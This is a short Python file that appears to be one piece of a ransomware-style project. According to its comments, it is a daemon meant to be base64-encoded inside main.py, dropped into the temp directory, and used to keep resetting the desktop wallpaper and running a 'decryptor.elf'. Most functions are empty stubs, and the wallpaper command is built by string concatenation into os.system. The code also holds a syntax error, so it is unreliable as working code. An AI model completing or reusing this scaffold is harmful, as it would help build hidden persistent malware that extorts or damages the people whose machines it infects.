import os
import subprocess
import tempfile
import threading

# this file is going to be compiled then turned into base64 encoded writen in the main.py file, then saved in the TEMPDIR to act as a daemon/
# it should have -> daemon wating for new files / change wallpaper / run decryptor.elf

TEMPDIR = tempfile.gettempdir()

def run_decryptor():
    pass

def change_wallpaper():
    wallpaper = 'gcwallpaper.png'
    if not os.path.isfile(os.path.join(TEMPDIR, wallpaper):
        # generate wallpaper
        pass

    os.system('gsettings set org.gnome.desktop.background picture-uri '+ os.path.join(TEMPDIR, wallpaper))


def menu():
    while True:
        change_wallpaper()
        run_decryptor()

if __name__ == '__main__':
    menu()
    pass
